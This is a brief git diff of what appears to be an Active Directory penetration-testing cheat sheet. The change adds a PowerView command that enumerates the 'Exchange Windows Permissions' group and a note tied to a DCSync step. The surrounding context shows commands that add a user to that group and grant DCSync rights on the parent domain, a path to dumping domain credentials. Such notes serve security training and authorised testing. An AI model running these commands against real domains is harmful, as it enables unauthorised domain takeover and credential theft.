@@ -1165,6 +1165,7 @@ Get-DomainGroup *exchange* -Domain <DOMAIN>
 ```
 Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
 Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
+Get-DomainGroupMember "Exchange Windows Permissions" -Domain <DOMAIN>
 ```
 
 #### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
@@ -1175,6 +1176,7 @@ Add-DomainGroupMember -Identity $group -Members $user -Verbose
 ```
 
 #### Add permissions to execute DCSYNC
+- When member of the ```Exchange Windows Permissions``` group
 ```
 Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
 ```
